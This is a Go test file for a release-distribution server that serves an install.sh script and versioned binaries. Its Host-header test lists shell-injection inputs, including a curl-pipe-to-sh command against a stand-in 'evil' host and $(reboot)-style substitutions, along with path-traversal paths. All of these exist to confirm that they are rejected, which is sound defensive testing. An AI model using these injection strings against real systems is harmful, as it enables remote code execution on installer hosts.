package store

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func distReq(t *testing.T, st *Store, method, path string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(method, path, nil)
	req.Host = "sesh.example.ts.net:8765"
	rr := httptest.NewRecorder()
	st.Handler().ServeHTTP(rr, req)
	return rr
}

func publishTestRelease(t *testing.T, st *Store, ver string, latest bool) {
	t.Helper()
	dir := filepath.Join(ReleasesDir(st.dir), ver)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "sesh-linux-amd64"), []byte("binary-"+ver), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "SHA256SUMS"), []byte("abc  sesh-linux-amd64\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if latest {
		if err := os.WriteFile(filepath.Join(ReleasesDir(st.dir), "latest"), []byte(ver+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func TestInstallScriptInterpolatesRequestBase(t *testing.T) {
	st := newTestStore(t, &bytes.Buffer{})
	rr := distReq(t, st, http.MethodGet, "/install.sh")
	if rr.Code != http.StatusOK {
		t.Fatalf("GET /install.sh = %d body=%s", rr.Code, rr.Body.String())
	}
	body := rr.Body.String()
	if !strings.Contains(body, `BASE='http://sesh.example.ts.net:8765'`) {
		t.Fatalf("installer BASE not interpolated from the request:\n%s", body[:200])
	}
	if strings.Contains(body, "{{BASE}}") {
		t.Fatal("installer left {{BASE}} unrendered")
	}
	if !strings.Contains(body, `setup --store-url "$BASE"`) {
		t.Fatal("installer does not hand off to sesh setup with the fetched base URL")
	}
	if cc := rr.Header().Get("Cache-Control"); cc != "no-cache" {
		t.Fatalf("install.sh Cache-Control = %q", cc)
	}

	head := distReq(t, st, http.MethodHead, "/install.sh")
	if head.Code != http.StatusOK || head.Body.Len() != 0 {
		t.Fatalf("HEAD /install.sh = %d bodyLen=%d", head.Code, head.Body.Len())
	}
}

// TestInstallScriptRejectsHostileHostAndIgnoresForwardedProto: the base URL
// is substituted into an executable curl|sh script, so no shell syntax may
// ever reach the response — hostile Host headers are rejected outright, and
// X-Forwarded-Proto is ignored entirely (no trusted proxy exists in our
// topologies).
func TestInstallScriptRejectsHostileHostAndIgnoresForwardedProto(t *testing.T) {
	st := newTestStore(t, &bytes.Buffer{})

	hostile := []string{
		`evil.example"; curl http://evil|sh; "`,
		"evil.example'; curl http://evil|sh; '",
		"evil.example$(reboot)",
		"evil.example`reboot`",
		"evil.example;reboot",
		"evil.example evil2.example",
		"evil.example|reboot",
		"evil.example\\reboot",
		"evil.example:8765/x",
		"-evil.example",
		"",
	}
	for _, host := range hostile {
		req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
		req.Host = host
		rr := httptest.NewRecorder()
		st.Handler().ServeHTTP(rr, req)
		if rr.Code != http.StatusBadRequest {
			t.Errorf("Host %q: status = %d, want 400", host, rr.Code)
		}
		if strings.Contains(rr.Body.String(), "evil") {
			t.Errorf("Host %q: hostile bytes reached the response body:\n%s", host, rr.Body.String())
		}
	}

	// X-Forwarded-Proto is never honored — neither a benign nor a hostile
	// value changes the substituted scheme or reaches the response.
	for _, proto := range []string{"https", `https'; reboot; '`} {
		req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
		req.Host = "sesh.example.ts.net:8765"
		req.Header.Set("X-Forwarded-Proto", proto)
		rr := httptest.NewRecorder()
		st.Handler().ServeHTTP(rr, req)
		if rr.Code != http.StatusOK {
			t.Fatalf("X-Forwarded-Proto %q: status = %d", proto, rr.Code)
		}
		if !strings.Contains(rr.Body.String(), "BASE='http://sesh.example.ts.net:8765'") {
			t.Errorf("X-Forwarded-Proto %q: substituted BASE is not the connection scheme", proto)
		}
		if strings.Contains(rr.Body.String(), "reboot") {
			t.Errorf("X-Forwarded-Proto %q: hostile bytes reached the response", proto)
		}
	}

	// Valid host shapes pass and land single-quoted verbatim.
	for _, host := range []string{"sesh.example.ts.net:8765", "100.64.0.1:8765", "[fd7a::1]:8765", "sesh"} {
		req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
		req.Host = host
		rr := httptest.NewRecorder()
		st.Handler().ServeHTTP(rr, req)
		if rr.Code != http.StatusOK {
			t.Errorf("Host %q: status = %d, want 200", host, rr.Code)
			continue
		}
		if !strings.Contains(rr.Body.String(), "BASE='http://"+host+"'") {
			t.Errorf("Host %q: BASE not single-quoted verbatim", host)
		}
	}
}

func TestLatestVersionEndpoint(t *testing.T) {
	st := newTestStore(t, &bytes.Buffer{})

	// Channel not yet published → 503, distinguishable from unknown (404).
	if rr := distReq(t, st, http.MethodGet, "/releases/latest/VERSION"); rr.Code != http.StatusServiceUnavailable {
		t.Fatalf("unpublished latest = %d, want 503", rr.Code)
	}

	publishTestRelease(t, st, "v1.2.3", true)
	rr := distReq(t, st, http.MethodGet, "/releases/latest/VERSION")
	if rr.Code != http.StatusOK || rr.Body.String() != "v1.2.3\n" {
		t.Fatalf("latest VERSION = %d %q", rr.Code, rr.Body.String())
	}
	if cc := rr.Header().Get("Cache-Control"); cc != "no-cache" {
		t.Fatalf("latest VERSION Cache-Control = %q (the pointer must never be cached)", cc)
	}

	// The design has exactly ONE latest endpoint: assets resolve only via
	// immutable /releases/<ver>/ paths, so a latest flip cannot mix releases.
	if rr := distReq(t, st, http.MethodGet, "/releases/latest/sesh-linux-amd64"); rr.Code != http.StatusNotFound {
		t.Fatalf("latest asset route must 404, got %d", rr.Code)
	}
}

func TestImmutableReleaseAssets(t *testing.T) {
	st := newTestStore(t, &bytes.Buffer{})
	publishTestRelease(t, st, "v1.2.3", true)

	rr := distReq(t, st, http.MethodGet, "/releases/v1.2.3/sesh-linux-amd64")
	if rr.Code != http.StatusOK || rr.Body.String() != "binary-v1.2.3" {
		t.Fatalf("asset = %d %q", rr.Code, rr.Body.String())
	}
	if cc := rr.Header().Get("Cache-Control"); !strings.Contains(cc, "immutable") {
		t.Fatalf("versioned asset Cache-Control = %q, want immutable", cc)
	}

	sums := distReq(t, st, http.MethodGet, "/releases/v1.2.3/SHA256SUMS")
	if sums.Code != http.StatusOK || !strings.Contains(sums.Body.String(), "sesh-linux-amd64") {
		t.Fatalf("SHA256SUMS = %d %q", sums.Code, sums.Body.String())
	}

	head := distReq(t, st, http.MethodHead, "/releases/v1.2.3/sesh-linux-amd64")
	if head.Code != http.StatusOK || head.Body.Len() != 0 {
		t.Fatalf("HEAD asset = %d bodyLen=%d", head.Code, head.Body.Len())
	}

	for _, path := range []string{
		"/releases/v9.9.9/sesh-linux-amd64", // unknown version
		"/releases/v1.2.3/sesh-plan9-mips",  // unknown asset
		"/releases/v1.2.3",                  // no asset segment
		"/releases/v1.2.3/a/b",              // extra segment
	} {
		if rr := distReq(t, st, http.MethodGet, path); rr.Code != http.StatusNotFound {
			t.Errorf("GET %s = %d, want 404", path, rr.Code)
		}
	}

	// Traversal shapes: the mux redirects dotted paths before routing; the
	// handler must also refuse them on its own (defense in depth).
	for _, path := range []string{"/releases/../secrets", "/releases/v1.2.3/..", "/releases/./latest"} {
		req := httptest.NewRequest(http.MethodGet, "/", nil)
		req.URL.Path = path
		rr := httptest.NewRecorder()
		st.handleReleases(rr, req)
		if rr.Code != http.StatusNotFound {
			t.Errorf("direct handleReleases %s = %d, want 404", path, rr.Code)
		}
	}
}

func TestDistributionDoesNotTouchWireRoutes(t *testing.T) {
	st := newTestStore(t, &bytes.Buffer{})
	// The wire surface still answers exactly as before: /v1/health is the
	// canary that adding distribution routes changed nothing under /v1.
	rr := distReq(t, st, http.MethodGet, "/v1/health")
	if rr.Code != http.StatusOK || !strings.Contains(rr.Body.String(), "wire_version") {
		t.Fatalf("/v1/health = %d %q", rr.Code, rr.Body.String())
	}
	if !IsDistributionPath("/install.sh") || !IsDistributionPath("/releases/v1/sesh-linux-amd64") {
		t.Fatal("IsDistributionPath must cover the distribution surface")
	}
	for _, p := range []string{"/v1/health", "/v1/files/claude/s/f/bytes", "/", "/v1/nodes"} {
		if IsDistributionPath(p) {
			t.Errorf("IsDistributionPath(%q) = true; wire routes must stay ship-only", p)
		}
	}
}
